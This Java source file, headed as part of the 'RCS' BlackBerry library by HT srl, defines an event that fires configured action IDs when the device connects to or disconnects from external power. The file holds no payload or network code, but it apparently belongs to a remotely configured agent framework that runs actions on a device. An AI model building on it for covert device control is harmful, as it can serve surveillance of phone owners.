//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AcEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class AcEvent.
 */
public final class AcEvent extends Event implements BatteryStatusObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);
    //#endif

    // private int lastStatus;

    int actionOnEnter;
    int actionOnExit;

    /**
     * Instantiates a new ac event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public AcEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_AC, actionId, confParams, "AcEvent");

        setPeriod(NEVER);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: AcEvent");
        //#endif
        AppListener.getInstance().addBatteryStatusObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: AcEvent");
        //#endif
        AppListener.getInstance().removeBatteryStatusObserver(this);
    }

    /**
     * Battery good.
     */
    public void batteryGood() {
        //#ifdef DEBUG
        debug.info("batteryGood");
        //#endif
    }

    /*
     * public void actualStop() { Application application =
     * Application.getApplication(); application.removeSystemListener(this);
     * debug.info("Removed SystemListener"); }
     */

    /**
     * Battery low.
     */
    public void batteryLow() {
        //#ifdef DEBUG
        debug.info("batteryLow");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.BatteryStatusObserver#onBatteryStatusChange(int,
     * int)
     */
    public void onBatteryStatusChange(final int status, final int diff) {
        // se c'e' una variazione su AC_CONTACTS
        if ((diff & DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER) != 0) {

            //#ifdef DEBUG
            debug.trace("Variation on EXTERNAL_POWER");
            //#endif

            final boolean ac = (status & DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER) > 0;
            if (ac) {
                //#ifdef DEBUG
                debug.info("AC On Enter");
                //#endif
                if (actionOnEnter != Action.ACTION_NULL) {
                    trigger(actionOnEnter);
                }
            } else {
                //#ifdef DEBUG
                debug.trace("Ac On Exit");
                //#endif
                if (actionOnExit != Action.ACTION_NULL) {
                    trigger(actionOnExit);
                }
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            actionOnExit = databuffer.readInt();
            actionOnEnter = actionId;

            //#ifdef DBC
            Check.asserts(actionOnEnter >= Action.ACTION_NULL,
                    "negative value Enter");
            Check.asserts(actionOnExit >= Action.ACTION_NULL,
                    "negative value Exit");
            //#endif

        } catch (final EOFException e) {
            actionOnEnter = Action.ACTION_NULL;
            actionOnExit = Action.ACTION_NULL;
            return false;
        }

        //#ifdef DEBUG
        final StringBuffer sb = new StringBuffer();
        sb.append("enter: " + actionOnEnter);
        sb.append(" exit: " + actionOnExit);
        debug.info(sb.toString());
        //#endif

        return true;
    }

}
